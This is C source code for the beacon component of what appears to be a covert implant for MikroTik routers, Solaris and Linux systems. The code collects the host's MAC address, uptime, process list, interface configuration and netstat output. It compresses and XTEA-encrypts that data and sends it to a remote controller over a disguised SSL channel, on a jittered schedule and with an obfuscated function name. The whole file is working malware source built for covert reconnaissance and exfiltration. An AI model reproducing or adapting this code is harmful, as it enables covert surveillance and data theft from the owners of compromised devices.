#include "polarssl/ssl.h"
#include "polarssl/havege.h"
#include "polarssl/xtea.h"
#include "beacon.h"
#include "survey_uptime.h"
#include "survey_mac.h"
#include "run_command.h"
#include "debug.h"
#include "threads.h"
#include "polarssl/crypto.h"
#include "proj_strings.h"
#include "compat.h"
#include "self_delete.h"
#include "process_list.h"
#include "ifconfig.h"
#include "netstat_an.h"
#include "netstat_rn.h"
#include "compression.h"

//******************************************************************
#if defined LINUX || defined SOLARIS
#include <pthread.h>
#endif

#ifdef DEBUG
#include "polarssl/include/polarssl/net.h"
#endif

//******************************************************************
static int send_beacon_data(BEACONINFO* beaconinfo, unsigned long uptime, int next_beacon);
static void encrypt_data(unsigned char* src, int src_size, unsigned char* dest, unsigned char* key);
//static void decrypt_data(unsigned char* src, unsigned char* dest);
static int get_printable_mac(unsigned char* dest, unsigned char* src);
static unsigned int generate_random_bytes(unsigned char * buf, unsigned int size);
static void extract_key(unsigned char* buf, unsigned char* key);
static void embedSize(unsigned int size, unsigned char* buf);

//******************************************************************
//***************** Cross Platform functions ***********************
//******************************************************************

//Obfuscate function string "calc_jitter"
#define calc_jitter psrh4593fds

int calc_jitter(int baseTime, float jitterPercent)
{
	//multiple the percentage by the basetime to get the
	//jitter range.
	int jitterRange = 0;

	jitterRange = baseTime * jitterPercent;
	//determine if the jitter will be positive or negative.
	if(rand() > RAND_MAX/2)
	{
		//make it positive
		return rand() % jitterRange;
	}
	else
	{
		//make it negative
		return -(rand() % jitterRange);
	}
}

unsigned int generate_random_bytes(unsigned char * buf, unsigned int size)
{
	unsigned int i;

	for (i=0;i<size;i++)
	{
		buf[i] = (unsigned char)(rand() % 255);
	}

	return 0;
}

void embedSize(unsigned int size, unsigned char* buf)
{
	unsigned int i;
	char sizeStr[30];
	unsigned char data[30];

	memset(sizeStr, 0, 30);
	memset(data, 0, 30);
	sprintf( sizeStr, "%u", size);

	data[0] = strlen(sizeStr) ^ XOR_KEY;

	for(i = 0; i < strlen(sizeStr) + 1; i++)
	{
		 data[i+1] = sizeStr[i] ^ XOR_KEY;
	}

	memcpy(buf,data,strlen(sizeStr)+1);
}

int beacon_start( char *beaconIP, int beaconPort, unsigned long initialDelay, int interval,float jitter)
{
	BEACONINFO 	*beaconInfo = NULL;
	int numTries = 0;

//TODO: check malloc() return value
	beaconInfo = (BEACONINFO *)malloc( sizeof( BEACONINFO ));
	memset( beaconInfo, 0, sizeof( BEACONINFO ) );

	//initalize IP string
//TODO: check malloc() return value
	beaconInfo->ip = (char*) malloc( strlen( beaconIP ) + 1 );

	//setup beacon stuct
	memcpy( beaconInfo->ip,beaconIP, strlen( beaconIP ) + 1 );
	beaconInfo->port = beaconPort;
	beaconInfo->initDelay = initialDelay;
	beaconInfo->interval = interval;
	beaconInfo->percentVariance = jitter;
	while(numTries != 5)
	{
		if( GetMacAddr(beaconInfo->macAddr) != SUCCESS)
		{
			numTries++;
			if( numTries == 5)
			{
				D(printf("ERROR: failed to pull MAC address\n" ); )
					return FAILURE;
			}
		}
		else
		{
			break;
		}
		// TODO: should this be Sleep( 60 * 100 ); ???
		sleep(60);
	}

	// NOTE: on Solaris 7, anything the thread writes to stdout,
	// or stderr will not be displayed on the main console output.
	// This default behavior is analogous to daemonizing the thread 

#if defined __EFENCE__ || defined __VALGRIND__
	if ( beacon( (void *)beaconInfo ) != SUCCESS )
	{
		D( printf( " ERROR: failed to create beacon thread\n" ); )
		return FAILURE;
	}
	else
	{
		goto not_reached;
	}
#endif
	if ( make_thread( beacon, (void *)beaconInfo ) != SUCCESS )
	{
		D( printf( " ERROR: failed to create beacon thread\n" ); )
		return FAILURE;
	}

	return SUCCESS;

	// NOT REACHED
//not_reached:
//	free( beaconInfo->ip );
//	free( beaconInfo );
	return SUCCESS;
}

//******************************************************************
// TODO: UNIX pthreads calls function that returns a void pointer?  
// is Windows flexible, if not, we can still be portable by defining a new 
// return type and having that defined, specifically, at compile time

void *beacon(void* param)
{
	unsigned long secondsUp = 0;
	int ret = 0;
	int beaconInterval = 0;
	int jitter = 0;
	BEACONINFO *beaconInfo = (BEACONINFO *)param;

#ifdef __VALGRIND__
	int counter = 0;
#endif

	D( printf ( " DEBUG: starting beacon thread\n" ); )

	D( printf ( " DEBUG: starting inital beacon delay of %d\n", beaconInfo->initDelay ); )

	//Wait out initial delay
	Sleep(beaconInfo->initDelay);

	secondsUp = GetSystemUpTime();
	D( printf( " DEBUG: system uptime is %ld\n", secondsUp ); )

	//Send initial beacon back

	// TODO: SendBeaconData does not handle errors returned
	if (beaconInfo->percentVariance > 0)
        {
		//get jitter
		jitter = calc_jitter(beaconInfo->interval, beaconInfo->percentVariance);
		//calculate new interval 
		beaconInterval = beaconInfo->interval + jitter;
	}
	else
	{
		beaconInterval = beaconInfo->interval;
	}
	D( printf( " DEBUG: sending [first] beacon data\n" ); )
	ret = send_beacon_data(beaconInfo,secondsUp,beaconInterval);

#if defined __EFENCE__ || defined __VALGRIND__
//	if ( COUNTER_LIMIT == 0 ) goto not_reached;
#endif

	//Loop that gets uptime
	for(;;)
	{
		//Sleep for the length of the interval
		D( printf ( " DEBUG: starting beacon interval of %d milliseconds.\n", beaconInfo->interval ); )
		Sleep(beaconInterval);
	
		if (beaconInfo->percentVariance > 0)
        	{
			//get jitter
			jitter = calc_jitter(beaconInfo->interval, beaconInfo->percentVariance);
			//calculate new interval 
			beaconInterval = beaconInfo->interval + jitter;
		}
		else
		{
			beaconInterval = beaconInfo->interval;
		}

		//get system uptime
		secondsUp = GetSystemUpTime();
		D( printf( " DEBUG: system uptime is %ld\n", secondsUp ); )

		//Beacon back
		// TODO: SendBeaconData does not handle errors returned
		D( printf( " DEBUG: sending beacon data\n" ); )
		ret = send_beacon_data(beaconInfo,secondsUp,beaconInterval);
		if(ret == SUCCESS)
		{
			update_file((char*)sdfp);
		}
#ifdef __VALGRIND__
	if ( ++counter > 10 ) goto not_reached;
#endif

	}

	// NOT REACHED
#ifdef __VALGRIND__
not_reached:
	terminate_thread();
#endif

	return (void *)NULL;
}

#include <stdlib.h>
//******************************************************************
static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int next_beacon)
{
	int					sock = 0;
	int					retval = 0;
	int					size = 0;
	int					defaultBufSize = 3000;
	unsigned int		packetSize = 0;
	unsigned int		compressedPacketSize = 0;
	int					encrypt_size = 0;
	int					bytes_sent = 0;
	int					sz_to_send = 0;
	int					recv_sz = 0;
	char				temp[1024];
	char				recv_buf[30];
	//unsigned char*		cmd_str = NULL;
	unsigned char*		enc_buf = NULL;
	unsigned char*		packet = NULL;
	unsigned char*		compressed_packet = NULL;
	unsigned char*		ptr = NULL;
	unsigned char		randData[64];
	unsigned char		key[16];

	//beacon packet structs
	BEACON_HDR			bhdr;
	ADD_HDR				mac_hdr;
	ADD_HDR				uptime_hdr;
	ADD_HDR				proc_list_hdr;
	ADD_HDR				ipconfig_hdr;
	ADD_HDR				netstat_rn_hdr;
	ADD_HDR				netstat_an_hdr;
	ADD_HDR				next_beacon_hdr;
	ADD_HDR				end_hdr;

	//beacon packet sizes. (used for memcpy)
	unsigned short mac_len = 0;
	unsigned short uptime_len = 0;
	unsigned short proc_list_len = 0;
	unsigned short ipconfig_len = 0;
	unsigned short netstat_rn_len = 0;
	unsigned short netstat_an_len = 0;
	unsigned short next_beacon_len = 0;

	//beacon data strings
	unsigned char* mac_data = NULL;
	unsigned char* uptime_data = NULL;
	unsigned char* proc_list_data = NULL;
	unsigned char* ipconfig_data = NULL;
	unsigned char* netstat_rn_data = NULL;
	unsigned char* netstat_an_data = NULL;
	unsigned char* next_beacon_data = NULL;
	
	//ssl related variables for proxy
	havege_state hs;
	ssl_context ssl;
	ssl_session ssn;

	ssl.major_ver = -1;//I'm doing this so that in clean up we only clean
	                   //up ssl contexts that have been initialized.
	memset(temp, 0, 1024);

	//MessageBox(NULL,"Let us Begin the Beacon!","OKAY",MB_OK);
	//Populate Beacon Header
#if defined MIKROTIK
	#if defined _PPC
	bhdr.os = htons(MIKROTIK_PPC);
	#elif defined _MIPSBE
	bhdr.os = htons(MIKROTIK_MIPSBE);
	#elif defined _MIPSLE
	bhdr.os = htons(MIKROTIK_MIPSLE);
	#elif defined _X86
	bhdr.os = htons(MIKROTIK_X86);
	#endif
#elif defined SOLARIS
	#if defined _SPARC
	bhdr.os = htons(SOLARIS_SPARC);
	#elif defined _X86
	bhdr.os = htons(SOLARIS_X86);
	#endif
#elif defined LINUX
	bhdr.os = htons(LINUX_X86);
#endif

	//TODO: Change this number whenever the version changes.
	bhdr.version = htons(27);

	//Populate Additional Headers
	//mac address
	mac_hdr.type = htons(MAC);
	mac_data = (unsigned char*) malloc(MAC_ADDR_LEN_FORMATTED);
	if(mac_data != NULL)
	{
		memset(mac_data, 0, MAC_ADDR_LEN_FORMATTED);
		get_printable_mac(mac_data, beaconInfo->macAddr);
	}
	mac_len = strlen((char *)mac_data);
	mac_hdr.length = htons(mac_len);
	//uptime
	uptime_hdr.type = htons(UPTIME);
	memset( temp, 0, 1024);
	sprintf( temp, "%lu", uptime);
	uptime_len = strlen(temp)+1;
	uptime_hdr.length = htons(uptime_len);

	uptime_data = (unsigned char*) malloc(uptime_len);
	if(uptime_data != NULL)
	{
		memset(uptime_data,0,uptime_len);
		memcpy(uptime_data,temp,uptime_len);
	}

	//next beacon time in seconds
	next_beacon_hdr.type = htons(NEXT_BEACON_TIME);
	memset(temp, 0, 1024);
	sprintf(temp, "%d", (next_beacon/1000));

	next_beacon_len = strlen(temp);
	next_beacon_hdr.length = htons(next_beacon_len);

	next_beacon_data = (unsigned char*) malloc(next_beacon_len);
	if(next_beacon_data != NULL)
	{
		memset(next_beacon_data, 0, next_beacon_len);
		memcpy(next_beacon_data, temp, next_beacon_len);
	}
	
	//process list
	proc_list_hdr.type = htons(PROCESS_LIST);
//TODO: check malloc() return value
	proc_list_data = get_process_list(&size);
	if( proc_list_data == NULL)
	{
		proc_list_len = 0;
	}
	else
	{
		proc_list_len = size;
	}
	proc_list_hdr.length = htons(proc_list_len);

	size = defaultBufSize;
	
	//ipconfig 
	ipconfig_hdr.type = htons(IPCONFIG);
	ipconfig_data = get_ifconfig(&size);
	if(ipconfig_data == NULL)
	{
		ipconfig_len = 0;
	}
	else
	{
		ipconfig_len = size;
	}

	ipconfig_hdr.length = htons(ipconfig_len);

	size = defaultBufSize;

	//netstat -rn

	netstat_rn_hdr.type = htons(NETSTAT_RN);
	netstat_rn_data = get_netstat_rn(&size);
	if(netstat_rn_data == NULL)
	{
		netstat_rn_len = 0;
	}
	else
	{
		netstat_rn_len = size;
	}
	netstat_rn_hdr.length = htons(netstat_rn_len);
	size = defaultBufSize;

	//netstat -an
	netstat_an_hdr.type = htons(NETSTAT_AN);
	netstat_an_data = get_netstat_an(&size);
	if(netstat_an_data == NULL)
	{
		netstat_an_len = 0;
	}
	else
	{
		netstat_an_len = size;
	}
	netstat_an_hdr.length = htons(netstat_an_len);
	size = defaultBufSize;

	end_hdr.type = htons(0);
	end_hdr.length = htons(0);
	//MessageBox(NULL,"Got Beacon Data!","OKAY",MB_OK);

	//create packet
	//size is equal to the size of a beacon header + the size of 6 additional headers (one of which
	// is the ending header) + the size of all the data fields.
	packetSize = (sizeof(ADD_HDR) * 8) + mac_len + uptime_len + 
		proc_list_len + ipconfig_len + netstat_rn_len + netstat_an_len + next_beacon_len;

	packet = (unsigned char*) malloc(packetSize);
	if( packet == NULL)
	{
		D(printf("Not enough memory to allocate packet!"));
		goto EXIT;
	}
	memset(packet, 0, packetSize);
	ptr = packet;
		
	//copy in mac hdr
	memcpy(ptr,(unsigned char*)&mac_hdr, sizeof(mac_hdr));
	ptr += sizeof(ADD_HDR);
	//copy in mac addr
	memcpy(ptr,mac_data, mac_len);
	ptr += mac_len;
	//copy in uptime hdr
	memcpy(ptr,(unsigned char*)&uptime_hdr, sizeof(uptime_hdr));
	ptr += sizeof(ADD_HDR);
	//copy in uptime data
	memcpy(ptr,uptime_data, uptime_len);
	ptr += uptime_len;
	//copy in next beacon hdr
	memcpy(ptr,(unsigned char*)&next_beacon_hdr,sizeof(next_beacon_hdr));
	ptr += sizeof(ADD_HDR);
	//copy in next beacon data
	memcpy(ptr,next_beacon_data,next_beacon_len);
	ptr += next_beacon_len;
	//copy in process list hdr
	if(proc_list_data != NULL)
	{
		memcpy(ptr,(unsigned char*)&proc_list_hdr, sizeof(proc_list_hdr));
		ptr += sizeof(ADD_HDR);
		//copy in process list
		memcpy(ptr,proc_list_data, proc_list_len);
		ptr += proc_list_len;
	}
	//copy in ipconfig hdr
	if(ipconfig_data != NULL)
	{
		memcpy(ptr,(unsigned char*)&ipconfig_hdr, sizeof(ipconfig_hdr));
		ptr += sizeof(ADD_HDR);
		//copy in ipconfig data
		memcpy(ptr,ipconfig_data, ipconfig_len);
		ptr += ipconfig_len;
	}
	//copy in netstat hdr
	if(netstat_rn_data != NULL)
	{
		memcpy(ptr,(unsigned char*)&netstat_rn_hdr, sizeof(netstat_rn_hdr));
		ptr += sizeof(ADD_HDR);
		//copy in netstat data
		memcpy(ptr,netstat_rn_data,netstat_rn_len);
		ptr += netstat_rn_len;
	}

	//copy in netstat hdr
	if(netstat_an_data != NULL)
	{
		memcpy(ptr,(unsigned char*)&netstat_an_hdr, sizeof(netstat_an_hdr));
		ptr += sizeof(ADD_HDR);
		//copy in netstat data
		memcpy(ptr,netstat_an_data,netstat_an_len);
		ptr += netstat_an_len;
	}

	//add closing header
	memcpy(ptr, (unsigned char*)&end_hdr, sizeof(end_hdr));

	ptr = NULL;

	//compress packet
	compressed_packet = compress_packet(packet,packetSize,&compressedPacketSize);

	//combine compressed_packet with beacon header.
	if(packet != NULL)
	{
		free(packet);
	}

	packetSize = sizeof(BEACON_HDR) + compressedPacketSize;
	packet = (unsigned char*)malloc(packetSize);
	if(packet == NULL)
	{
		goto EXIT;
	}

	//zero out buffer
	memset(packet,0,packetSize);
	//copy in beacon hdr
	memcpy(packet,&bhdr,sizeof(BEACON_HDR));
	//copy in compressed data
	memcpy(packet+sizeof(BEACON_HDR),compressed_packet,compressedPacketSize);

	//calculate encryption buffer size
	encrypt_size = packetSize + (8 - (packetSize % 8));

	//connect to the client
	D( printf("%s, %4d: Connecting to client...\n", __FILE__, __LINE__); )
	retval = net_connect(&sock,beaconInfo->ip, beaconInfo->port);

	if ( retval != SUCCESS )
	{
		D( printf(" ERROR: net_connect()\n"));

#ifdef DEBUG
		if ( retval == POLARSSL_ERR_NET_CONNECT_FAILED )
		{
			printf( " ERROR: NET_CONNECT_FAILED\n" );
		}
		else if ( retval == POLARSSL_ERR_NET_SOCKET_FAILED )
		{
			printf( " ERROR: NET_SOCKET_FAILED\n" );
		}
		else if ( retval == POLARSSL_ERR_NET_UNKNOWN_HOST )
		{
			printf( " ERROR: NET_UNKNOWN_HOST\n" );
		}
		else
		{
			printf( " ERROR: Unknown net_connect() error\n" );
		}
#endif

		// we can return from here. no need to goto to bottom of function because
		// at this stage, there is nothing to clean-up
		//return FAILURE; 
		//Don't think that is true you have allocated all of your beacon info
		//however it just couldnt connect out lets clean up
		retval = FAILURE;
		goto EXIT;
	}

	//setup ssl
	D( printf("%s, %4d: Setup crypto\n", __FILE__, __LINE__); )
	if(crypt_setup_client( &hs, &ssl, &ssn, &sock ) != SUCCESS)
	{
		D( printf(" ERROR: crypt_setup_client()\n") );
		retval = FAILURE;
		goto EXIT;
	}

	//set swindle flag to true
	ssl.use_custom = 1;
	ssl.tool_id = TOOL_ID;
	ssl.xor_key = TOOL_ID_XOR_KEY;

	//perform an SSL handshake
	D( printf("%s, %4d: Perform SSL handshake\n", __FILE__, __LINE__); )
	if( crypt_handshake(&ssl) != SUCCESS)
	{
		D( printf( " ERROR: SSL connection with SSL server failed to initialize.\n" ); )
			retval = FAILURE;
		goto EXIT;
	}

	D( printf(" Handshake Complete!\n") );

	//turn off the ssl encryption since we us our own
	ssl.do_crypt = 0;

	//generate 32 random bytes
	generate_random_bytes(randData,64);

	//embed the data size so the server knows how much data to read
	embedSize(encrypt_size,randData);
	D(printf("Encrypt_size is %d \n",encrypt_size));

	D( printf( " Sending the first 64 bytes with data size encoded in random data\n" ); )
	//send the bytes 
	if( 0 > crypt_write(&ssl, randData,64) )
	{  //TODO: this is probably no the best check... maybe 32 > cryptwrite
		retval = FAILURE;
		goto EXIT;
	}

	//receive the buffer
	memset(randData, 0, 64);

	if( 0 > recv(sock,(char*)randData,37,0))
	{
		retval = FAILURE;
		goto EXIT;
	}

	//extract the key
	extract_key(randData + 5,key);

	//encrypt the beacon data with the extracted key
	//the buffer is padded so that it can be broken
	//up into 8 byte chunks
	enc_buf = (unsigned char*) malloc(encrypt_size); 
	if(enc_buf == NULL)
	{
		D(printf("Could not allocate space for enc_buf"));
		goto EXIT;
	}
	memset(enc_buf, 0 , encrypt_size);

	encrypt_data(packet,packetSize,enc_buf,key);
	
	//send the data
	//while we haven't sent all data keep going
	//send size embedded in rand data
	//send encrypted data
	do 
	{
		//embed the data size so the server knows how much data to read
		if( (encrypt_size - bytes_sent) >= MAX_SSL_PACKET_SIZE)
		{
			sz_to_send = MAX_SSL_PACKET_SIZE;
		} 
		else
		{
			sz_to_send = encrypt_size - bytes_sent;
		}
		D( printf( " Sending: %d \n", sz_to_send ) );

		//reset the buffer
		memset(randData, 0, 64);

		retval = crypt_write( &ssl, enc_buf + bytes_sent, sz_to_send);
		if( retval < 0)
		{
			retval = FAILURE;
			goto EXIT;
		}

		//receive ack
		memset(recv_buf, 0, 30);

		retval = recv(sock, recv_buf,30,0);
		recv_sz = atoi(recv_buf + (sizeof(SSL_HDR) - 1));
		bytes_sent += recv_sz;

	} while (bytes_sent < encrypt_size);

	retval = SUCCESS;
	D( printf("Finished sending beacon about to clean up!\n"));
	D( printf("BEACON SENT!\n"));

EXIT:
	//cleanup
	if( ssl.major_ver >= 1 )
	{
		crypt_close_notify( &ssl );
		crypt_cleanup( &ssl );
	}

	if(mac_data != NULL)
	{
		free(mac_data);
	}

	if(uptime_data != NULL)
	{
		free(uptime_data);
	}

	if(next_beacon_data != NULL)
	{
		free(next_beacon_data);
	}

	if(proc_list_data != NULL)
	{
		release_process_list(proc_list_data);
	}

	if(ipconfig_data != NULL)
	{
		release_ifconfig(ipconfig_data);
	}

	if(netstat_rn_data != NULL)
	{
		release_netstat_rn(netstat_rn_data);
	}

	if(netstat_an_data != NULL)
	{
		release_netstat_an(netstat_an_data);
	}

	if(enc_buf != NULL)
	{
		free(enc_buf);
	}

	if(packet != NULL)
	{
		free(packet);
	}

	if(compressed_packet != NULL)
	{
		release_compressed_packet(compressed_packet);
	}

	if ( sock > 0 ) net_close( sock );

	return retval;
}

//******************************************************************

void encrypt_data(unsigned char* src, int src_size, unsigned char* dest, unsigned char* key)
{
	xtea_context xtea;
	int i,x;
	unsigned char* src_ptr;
	unsigned char* dest_ptr;
	unsigned char enc[8];
	unsigned char buf[8];
	
	//initialize the xtea encryption context
	xtea_setup(&xtea,key);

	i = 0;
	
	while(i < src_size)
	{
		src_ptr = src + i;
		dest_ptr = dest +i;
		if( (src_size - i) < 8)
		{
			for(x = 0; x < (src_size - i); ++x)
			{
				buf[x] = src_ptr[x];
			}
			memset(buf + (src_size - i), 0, (8 - (src_size-i)) );
		}
		else
		{
			for(x = 0; x < 8; ++x)
			{
				buf[x] = src_ptr[x];
			}
		}

		xtea_crypt_ecb(&xtea,XTEA_ENCRYPT,buf,enc);

		memcpy(dest_ptr,enc,8);
		i += 8;
	}
}

/*void decrypt_data(unsigned char* src, unsigned char* dest)
{

	xtea_context xtea;
	int len,i;
	unsigned char* src_ptr;
	unsigned char* dest_ptr;
	unsigned char enc[8];

	//initialize the xtea encryption context
	xtea_setup(&xtea,SharedKey);

	len = sizeof(BEACONFIELD);//strlen(src);
	i = 0;

	while(i != len)
	{
		src_ptr = src + i;
		dest_ptr = dest +i;

		xtea_crypt_ecb(&xtea,XTEA_DECRYPT,src_ptr,enc);

		if(len - i >= 8)
		{
			memcpy(dest_ptr,enc,8);
			i += 8;
		}
		else
		{
			memcpy(dest_ptr,enc,(len - i));
			i = i + (len-i);
		}
	}
}*/

//******************************************************************
int get_printable_mac(unsigned char* dest, unsigned char* src)
{
	char buffer[18];
	memset(buffer,0,18);

	//change for windows2000 from sprintf_s to sprintf
	/*sprintf(buffer,sizeof(buffer),"%.2x-%.2x-%.2x-%.2x-%.2x-%.2x",
                src[0],
                src[1],
                src[2],
                src[3],
                src[4],
                src[5]);*/
	sprintf(buffer,"%.2x-%.2x-%.2x-%.2x-%.2x-%.2x",
		src[0],
		src[1],
		src[2],
		src[3],
		src[4],
		src[5]);

	memcpy(dest,buffer,18);
	return 0;
}


//******************************************************************
void extract_key(unsigned char* buf, unsigned char* key)
{
	int offset;

	//calculate the offset so we know where to extract the key
	offset = (buf[0] ^ XOR_KEY) % 15;

	//extract the key
	memcpy(key, buf + offset + 1, 16);
}

//******************************************************************
//************** Platform specific functions ***********************
//******************************************************************



//******************************************************************
